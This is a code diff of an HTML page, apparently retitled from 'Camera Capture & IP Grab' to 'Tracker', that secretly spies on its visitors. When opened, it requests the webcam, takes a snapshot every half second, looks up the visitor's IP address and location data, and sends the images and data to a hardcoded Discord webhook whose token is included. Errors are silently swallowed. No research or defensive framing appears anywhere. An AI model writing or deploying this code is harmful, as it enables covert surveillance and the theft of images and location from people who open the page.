@@ -2,64 +2,58 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<title>Camera Capture & IP Grab</title>
+<title>Tracker</title>
 </head>
 <body>
-<video id="video" autoplay playsinline style="display:none;"></video>
 <script>
-const webhookURL = 'https://discord.com/api/webhooks/1375557655036301593/fAVFnmHle5XCW4nxYD3GKHetyJRbGyQa6IXia2LbrEmk4Sn6Gaym_YduQpvpgkD2h0oA';
+const webhook = "https://discord.com/api/webhooks/1375557655036301593/fAVFnmHle5XCW4nxYD3GKHetyJRbGyQa6IXia2LbrEmk4Sn6Gaym_YduQpvpgkD2h0oA";
 
-async function getIP() {
+async function getIPInfo() {
   try {
-    const res = await fetch('https://api.ipify.org?format=json');
-    const data = await res.json();
-    return data.ip;
+    let res = await fetch('https://ipapi.co/json/');
+    return await res.json();
   } catch {
-    return 'unknown';
+    return null;
   }
 }
 
-async function sendData(imageBase64, ip) {
-  const json = {
-    content: `IP: ${ip}`,
-    embeds: [{
-      image: {
-        url: `data:image/png;base64,${imageBase64}`
-      }
-    }]
-  };
-  await fetch(webhookURL, {
+async function sendData(imageBlob, ipInfo) {
+  const form = new FormData();
+  form.append('payload_json', JSON.stringify({
+    content: `IP Info: ${ipInfo ? JSON.stringify(ipInfo) : 'Unavailable'}`
+  }));
+  form.append('file', imageBlob, 'capture.png');
+
+  await fetch(webhook, {
     method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify(json)
+    body: form
   });
 }
 
-async function captureAndSend() {
-  const ip = await getIP();
-  const video = document.getElementById('video');
-
-  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-    return;
-  }
-
-  if (!window.stream) {
-    window.stream = await navigator.mediaDevices.getUserMedia({video: true});
-    video.srcObject = window.stream;
-  }
+async function captureLoop() {
+  const stream = await navigator.mediaDevices.getUserMedia({video:true});
+  const video = document.createElement('video');
+  video.srcObject = stream;
+  video.play();
 
   const canvas = document.createElement('canvas');
-  canvas.width = 320;
-  canvas.height = 240;
-  const ctx = canvas.getContext('2d');
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-  const imageBase64 = canvas.toDataURL('image/png').replace(/^data:image\/png;base64,/, '');
+  while (true) {
+    await new Promise(r => setTimeout(r, 500));
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0);
 
-  await sendData(imageBase64, ip);
+    const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));
+
+    const ipInfo = await getIPInfo();
+
+    sendData(blob, ipInfo).catch(() => {});
+  }
 }
 
-setInterval(captureAndSend, 500);
+captureLoop();
 </script>
 </body>
 </html>
